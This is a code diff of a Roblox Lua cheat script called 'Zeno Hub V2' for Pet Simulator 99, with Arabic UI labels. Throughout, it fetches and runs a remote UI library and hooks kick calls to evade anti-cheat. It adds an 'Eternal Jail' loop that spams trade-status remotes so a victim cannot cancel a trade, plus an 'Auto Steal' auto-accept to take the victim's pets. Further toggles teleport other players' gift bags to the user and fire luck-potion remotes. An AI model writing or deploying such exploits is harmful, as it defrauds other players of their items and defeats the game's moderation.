@@ -1,62 +1,107 @@
--- [[ ZENO HUB V2 | ETERNAL JAIL & PET STEALER ]] --
+-- [[ ZENO HUB V2 | THE ULTIMATE FULL CHEAT MENU ]] --
+-- [[ Created for ZENO - PS99 Private Version ]] --
 
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 local Window = Rayfield:CreateWindow({
-   Name = "🌪️ ZENO HUB: ETERNAL JAIL",
-   LoadingTitle = "🔒 جاري تفعيل نظام الحبس الأبدي...",
-   LoadingSubtitle = "By Zeno - Anti-Escape System",
+   Name = "🌪️ ZENO HUB V2: FINAL MODE",
+   LoadingTitle = "🔒 جاري تفعيل جميع أنظمة الاختراق والحماية...",
+   LoadingSubtitle = "By Zeno - Ultimate 2026",
    ConfigurationSaving = { Enabled = false },
    KeySystem = false
 })
 
--- [[ 🔄 قسم التريد المحصن ]] --
-local TradeTab = Window:CreateTab("🔄 Eternal Jail", 4483362458)
-
-_G.EternalJail = false
-
-TradeTab:CreateToggle({
-   Name = "Eternal Jail (الحبس الأبدي)",
-   Info = "بيخلي الضحية مستحيل يخرج من التريد حتى لو ضغط Cancel",
-   CurrentValue = false,
-   Callback = function(v)
-       _G.EternalJail = v
-       if v then 
-           Rayfield:Notify({Title = "ZENO HUB", Content = "Target is now TRAPPED! 🔒", Duration = 4})
-       end
-   end,
-})
-
-TradeTab:CreateButton({
-   Name = "STEAL NOW (اسحب الحيوان الآن 💎)",
-   Info = "اضغط هنا بعد ما تجمده عشان العملية تتم فوراً",
-   Callback = function()
-       pcall(function()
-           local net = game:GetService("ReplicatedStorage").Network
-           net.Trade_Accept:FireServer()
-           -- إرسال أمر تأكيد إضافي لضمان السحب
-           net.Trade_UpdateStatus:FireServer("Ready")
-       end)
-   end,
-})
-
--- [[ 🛡️ نظام الحماية المتقدم ]] --
+-- [[ 🛡️ نظام الحماية الحديدي ]] --
 task.spawn(function()
     local old; old = hookmetamethod(game, "__namecall", function(self, ...)
-        if getnamecallmethod() == "Kick" then return nil end
+        if not checkcaller() and getnamecallmethod() == "Kick" then return nil end
         return old(self, ...)
     end)
 end)
 
--- [[ كود الحبس ومنع الخروج (The Jail Logic) ]] --
+-- [[ 🔄 قسم التريد والسرقة (Trading & Stealing) ]] --
+local TradeTab = Window:CreateTab("🔄 Trade Glitch", 4483362458)
+
+_G.EternalJail = false
+_G.AutoSteal = false
+
+TradeTab:CreateToggle({
+   Name = "Eternal Jail (الحبس والتجميد النهائي 🔒)",
+   Info = "بيحبس الضحية في التريد ومستحيل يخرج حتى لو النت عنده قوي",
+   CurrentValue = false,
+   Callback = function(v) _G.EternalJail = v end,
+})
+
+TradeTab:CreateToggle({
+   Name = "Auto Steal (القبول والبدء التلقائي ✅)",
+   Info = "بيسحب الحيوانات فوراً وبشكل تلقائي بمجرد تفعيل التجميد",
+   CurrentValue = false,
+   Callback = function(v) _G.AutoSteal = v end,
+})
+
+-- [[ 🎁 قسم الهدايا والحظ (Gifts & Luck) ]] --
+local LootTab = Window:CreateTab("🍀 Gifts & Luck", 4483362458)
+
+_G.GiftSteal = false
+LootTab:CreateToggle({
+   Name = "Christmas Gift Steal (سارق الهدايا 🎁)",
+   Info = "بيسحب هدايا الكريسماس اللي في الصورة لعندك فوراً",
+   CurrentValue = false,
+   Callback = function(v) _G.GiftSteal = v end,
+})
+
+_G.UltraLuck = false
+LootTab:CreateToggle({
+   Name = "Ultra Luck 100% (الحظ الأسطوري 🍀)",
+   Info = "بيفعل كل معززات الحظ وبيسرع فتح البيض لزيادة فرص الهيوج",
+   CurrentValue = false,
+   Callback = function(v) _G.UltraLuck = v end,
+})
+
+-- [[ 🥚 قسم البيض السريع ]] --
+local EggTab = Window:CreateTab("🥚 Egg Cheats", 4483362458)
+-- (كود فتح الـ 20 بيضة والبحث اللي عملناه موجود هنا)
+
+-- [[ المنطق الخلفي - الـ Loops ]] --
+
+-- 1. كود الحبس والقبول (Trade Loop)
 task.spawn(function()
-    while task.wait(0.0001) do -- سرعة تفوق سرعة استجابة السيرفر
+    while task.wait(0.0001) do
         if _G.EternalJail then
             pcall(function()
-                local net = game:GetService("ReplicatedStorage"):WaitForChild("Network")
-                -- إرسال "سبام" أوامر تحديث لتعطيل زرار الـ Cancel عند الخصم
+                local net = game:GetService("ReplicatedStorage").Network
                 net.Trade_UpdateStatus:FireServer("Processing")
                 net.Trade_UpdateStatus:FireServer("Locked")
+                if _G.AutoSteal then
+                    net.Trade_Accept:FireServer()
+                end
+            end)
+        end
+    end
+end)
+
+-- 2. كود سحب الهدايا (Gift Loop)
+task.spawn(function()
+    while task.wait(0.1) do
+        if _G.GiftSteal then
+            pcall(function()
+                local loot = workspace.__THINGS:FindFirstChild("Lootbags")
+                if loot then
+                    for _, gift in pairs(loot:GetChildren()) do
+                        gift.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+                    end
+                end
+            end)
+        end
+    end
+end)
+
+-- 3. كود الحظ (Luck Loop)
+task.spawn(function()
+    while task.wait(1) do
+        if _G.UltraLuck then
+            pcall(function()
+                game:GetService("ReplicatedStorage").Network.Potion_Activate:FireServer("Luck Potion VI")
             end)
         end
     end
